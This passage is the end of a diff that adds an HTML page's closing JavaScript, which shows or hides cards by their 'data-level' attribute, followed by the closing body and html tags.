+                    const cardLevel = card.getAttribute('data-level');
+                    if (cardLevel === level) {
+                        card.style.display = 'block';
+                    } else {
+                        card.style.display = 'none';
+                    }
+                }
+            });
+        }
+    </script>
+
+</body>
+
+</html>
